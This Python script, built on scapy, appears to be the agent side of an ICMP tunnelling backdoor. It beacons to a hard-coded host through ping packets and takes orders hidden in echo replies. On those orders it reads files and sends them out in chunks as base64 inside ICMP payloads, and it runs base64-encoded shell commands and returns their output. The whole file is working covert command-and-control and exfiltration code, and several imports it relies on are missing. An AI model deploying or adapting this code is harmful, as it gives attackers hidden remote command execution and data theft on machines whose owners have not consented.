from scapy.all import *
import base64
import time

destination = "192.168.56.1"
sniffInterface = "enp0s8"
delayToKeepAlive = 5
sendKeepAlive = True

CHUNK_SIZE = 1024
def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

def read_in_chunks(file_object, chunk_size=1024):
    """Lazy function (generator) to read a file piece by piece.
    Default chunk size: 1k."""
    while True:
        data = file_object.read(chunk_size)
        if not data:
            break
        yield data

def keepAlive():
    while(True):
        if (sendKeepAlive):
            print("[KeepAlive] Sending keep alive ... \n")
            sendMessage(destination, "keepAlive")
            time.sleep(delayToKeepAlive)


# @return ICMP message's bytes
def sniffMessage():
    while(True):
        a = sniff(iface=sniffInterface, filter="icmp", count=1)
        # 0 is echo-reply and only listen for those
        if a[0][2].fields.get("type") == 0:
            return a[0][3].fields.get("load")

# Send echo-request
def sendMessage(destination, string):
    p = sr1(IP(dst=destination)/ICMP(type=8, id=1, seq=1)/string, timeout=0)
    # timeout is set to 0 to prevent waiting on the reply (that could never come)

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


if __name__ == "__main__":

    if not isAdmin():
        print("The script must be run as Administrator or root")
        exit()

    keepAliveThread = Thread(target = keepAlive)
    keepAliveThread.start()
    
    while True:

        action = sniffMessage().decode("utf-8")
        print("Received action : '"+action+"'")

        if action == "file":
            sendKeepAlive = False

            fileName = sniffMessage().decode("utf-8")
            fileToSend = open(fileName,"rb")
            binaryData = fileToSend.read()
            encoded = (base64.b64encode(binaryData)).decode('ascii')

            print("fileToSend: "+fileName)
            print("Encoded file: "+encoded)
            sendMessage(destination, encoded)

            sendKeepAlive = True

        elif action == "bigfile":
            sendKeepAlive = False

            #print("Sending protocol and filename")
            # Protocole : type d'envoi (file/message)
            #p = sr1(IP(dst=destination)/ICMP()/"bigfile")
            #p = sr1(IP(dst=destination)/ICMP()/fileName)

            fileName = sniffMessage().decode("utf-8")

            fileStats = os.stat(fileName)
            print(f'File Size in Bytes is {fileStats.st_size}')
            predictedNumberOfPings = math.ceil(fileStats.st_size / CHUNK_SIZE)

            p = sr1(IP(dst=destination)/ICMP()/str(predictedNumberOfPings))

            pingCounter = 0
            with open(fileName,"rb") as f:
                for piece in read_in_chunks(f, CHUNK_SIZE):
                    encoded = (base64.b64encode(piece)).decode('ascii')
                    p = send(IP(dst=destination)/ICMP()/encoded)
                    pingCounter = pingCounter + 1

            print(f'Predicted number of pings to send: {predictedNumberOfPings}')
            print("Number of pings sent: "+str(pingCounter))
            print("Sending bigfileSTOP")
            p = send(IP(dst=destination)/ICMP()/"bigfileSTOP")

            sendKeepAlive = True
        elif action == "command":

            sendKeepAlive = False

            base64Command = sniffMessage().decode("utf-8")
            print("base64 command : "+base64Command)
            decodedCommand = base64.b64decode(base64Command).decode("utf-8")
            print("Decoded command : "+decodedCommand)

            result = subprocess.run(
                decodedCommand.split(),
                shell = True,
                capture_output = True, # Python >= 3.7 only
                text = True # Python >= 3.7 only
            )
            output = "stdout:\n"+result.stdout+"\n\nstderr:\n"+result.stderr
            print("command output: "+output)

            encodedOutput = base64.b64encode(output.encode('utf-8'))
            sendMessage(destination, encodedOutput)

            print("Finished sending command output")
            
            sendKeepAlive = True

        elif action == "message":
            print(sniffMessage().decode("utf-8"))
